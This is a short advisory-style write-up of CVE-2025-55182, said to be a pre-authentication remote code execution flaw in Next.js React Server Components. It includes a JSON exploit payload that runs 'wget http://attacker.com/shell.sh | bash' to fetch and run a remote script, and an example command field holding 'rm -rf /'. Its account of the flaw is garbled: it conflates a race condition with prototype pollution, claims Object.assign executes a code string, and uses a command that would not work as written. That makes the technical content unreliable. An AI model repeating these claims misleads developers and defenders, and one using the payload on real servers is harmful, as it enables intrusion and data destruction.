CVE-2025-55182 is a **pre-authentication Remote Code Execution (RCE)** vulnerability (CVSS 10.0) in Next.js’s React Server Components (RSC) due to improper deserialization of server actions. The flaw arises from a **time-of-check to time-of-use (TOCTOU) race condition** in Next.js’s `unstable_serverAction` handler, where user-supplied JSON payloads (e.g., `{"action":"exec","cmd":"rm -rf /"}`) bypass input validation via **Prototype Pollution** (CWE-1320). The exploit chain begins with a maliciously crafted HTTP POST to `/_next/data/[hash]/api/actions` containing a serialized JavaScript object with a `prototype` property:

```json
{
  "type": "server_action",
  "props": {
    "prototype": {
      "constructor": {
        "func": "require('child_process').exec('wget http://attacker.com/shell.sh | bash')"
      }
    }
  }
}
```

When processed by Next.js’s RSC engine (`@next/react-server-dom-webpack`), the polluted prototype triggers `Object.assign()` in the `serverAction` module, executing arbitrary shell commands with the privileges of the Node.js process (typically `node`). Proof-of-concept (PoC) exploits use **Burp Suite** to intercept and modify RSC payloads, while **Metasploit’s `nextjs_rce` module** automates exploitation against vulnerable versions (Next.js 14.1.0–14.2.3). Real-world exploitation has been observed in **Supply Chain Attacks** targeting Next.js applications (e.g., **dependency confusion** via malicious `react-server-dom-webpack` packages). Mitigation requires upgrading to Next.js **v14.2.4+**, setting `NODE_ENV=production`, and enforcing **Content Security Policy (CSP)** headers to block dynamic code evaluation.

